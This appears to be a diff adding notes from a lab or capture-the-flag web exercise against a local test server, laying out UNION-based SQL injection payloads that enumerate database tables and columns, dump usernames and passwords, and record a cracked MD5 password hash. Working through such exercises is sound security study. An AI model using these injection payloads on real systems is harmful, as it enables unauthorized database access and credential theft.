@@ -1,0 +1,23 @@
+page : http://192.168.120.128/index.php?page=member
+
+# Get tables name in the DB
+0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+# find table columns in the DB for each table
+0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
+
+# Table structure :
+
+Table name: db_default
+column : id
+
+Table name: db_default
+column : username
+
+Table name: db_default
+column : password
+
+0 OR 1 = 2 UNION SELECT username, password FROM Member_Brute_Force.db_default
+
+# root and admin password are crypted using md5(). The output is : 3bf1114a986ba87ed28fc1b5884fc2f8
+# Decrypted, the output is : shadow
